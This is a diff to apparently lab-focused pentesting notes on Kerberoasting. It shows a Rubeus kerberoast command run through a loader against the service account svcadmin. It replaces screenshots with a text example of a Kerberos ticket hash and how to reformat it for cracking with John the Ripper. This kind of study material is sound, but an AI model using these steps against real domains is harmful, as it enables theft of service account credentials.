@@ -67,15 +67,9 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcad
 /nowrap # results will not be line wrapped
 /stats # will output statistics about kerberoastable users found
 ```
-{% hint style="warning" %} use John the Ripper to brute-force the hashes. Please note that you need to remove ":1433" from the SPN in hashes.txt before running John {% endhint %}
-
-**before:**
-
-<figure><img src="../assets/kerberosting-hash1.png" alt=""><figcaption></figcaption></figure>
-
-**after:** 
-
-<figure><img src="../assets/kerberosting-hash2.png" alt=""><figcaption></figcaption></figure>
+{% hint style="warning" %} use John the Ripper to brute-force the hashes. Please note that you need to remove ":1433" from the SPN in hashes.txt before running John 
+$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorpmgmt.dollarcorp.moneycorp.local :1433* should be $krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorpmgmt.dollarcorp.moneycorp.local* in hashes.txt 
+{% endhint %}
 
 ## Crack
 
